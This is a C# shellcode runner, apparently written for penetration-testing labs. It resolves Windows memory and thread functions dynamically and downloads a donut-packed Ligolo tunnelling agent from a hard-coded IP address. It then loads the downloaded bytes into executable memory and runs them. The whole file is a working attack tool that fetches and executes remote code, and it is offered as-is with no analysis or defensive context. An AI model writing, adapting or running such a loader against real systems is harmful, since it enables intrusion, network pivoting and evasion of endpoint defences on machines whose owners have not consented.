using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Ligolo_Shellcode_Runner
{
    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate bool VirtualProtectDelegate(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        private delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate UInt32 WaitForSingleObjectDelegate(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            IntPtr hKernel32 = LoadLibraryA("kernel32.dll");

            IntPtr pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
            IntPtr pVirtualProtect = GetProcAddress(hKernel32, "VirtualProtect");
            IntPtr pCreateThread = GetProcAddress(hKernel32, "CreateThread");
            IntPtr pWaitForSingleObject = GetProcAddress(hKernel32, "WaitForSingleObject");

            VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualAlloc, typeof(VirtualAllocDelegate));
            VirtualProtectDelegate VirtualProtect = (VirtualProtectDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtectDelegate));
            CreateThreadDelegate CreateThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(CreateThreadDelegate));
            WaitForSingleObjectDelegate WaitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(pWaitForSingleObject, typeof(WaitForSingleObjectDelegate));
                         
            // Ligolo donut shellcode 
            // donut -a 2 -f 1 -o agent.bin -i agent.exe
            string url = "http://192.168.45.177/ligolo/agent.bin";
            WebClient client = new WebClient();
            byte[] buf = client.DownloadData(url);

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x04);
            Marshal.Copy(buf, 0, addr, size);
            uint oldProtect;
            VirtualProtect(addr, (uint)size, 0x20, out oldProtect);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
